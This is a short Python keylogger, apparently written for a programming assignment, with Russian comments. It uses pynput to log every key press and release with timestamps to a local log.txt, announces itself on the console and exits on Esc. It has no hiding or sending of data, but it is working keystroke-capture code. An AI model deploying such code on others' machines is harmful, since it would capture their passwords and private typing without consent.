import datetime
from pynput import keyboard

# Имя файла для логирования согласно заданию
LOG_FILE = "log.txt"

def get_current_time():
    """Возвращает текущую дату и время в формате DD.MM.YYYY HH:MM:SS"""
    return datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")

def format_key_name(key):
    """Форматирует отображение клавиш (включая специальные)"""
    try:
        # Обычные символьные клавиши
        return f"'{key.char}'"
    except AttributeError:
        # Специальные клавиши (Space, Enter, Shift и т.д.)
        # Приводим к нижнему регистру для соответствия шаблону 'key1'
        return f"'{str(key).replace('Key.', '')}'"

def on_press(key):
    """Вызывается при нажатии клавиши (down)"""
    timestamp = get_current_time()
    key_name = format_key_name(key)
    log_entry = f"{timestamp} down {key_name}\n"
    
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)


def on_release(key):
    """Вызывается при отпускании клавиши (release)"""
    timestamp = get_current_time()
    key_name = format_key_name(key)
    log_entry = f"{timestamp} release {key_name}\n"
    
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)
        
    # Прерывание работы программы при нажатии Esc
    if key == keyboard.Key.esc:
        return False
        
    # ЯВНО возвращаем True, чтобы заявить анализатору,
    # что слушатель должен продолжать работу
    return True


def keyloggerstart():
    """Инициализация и запуск кейлоггера"""
    # Запись времени старта программы
    start_time = get_current_time()
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"Program start at {start_time}\n")
        
    print(f"Кейлоггер запущен. Лог пишется в {LOG_FILE}. Для выхода нажмите ESC.")

    # Запуск слушателя клавиатуры Listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # Запись времени остановки программы после завершения работы listener
    stop_time = get_current_time()
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"Program stop at {stop_time}\n")
    print("Кейлоггер успешно остановлен.")

if __name__ == "__main__":
    keyloggerstart()

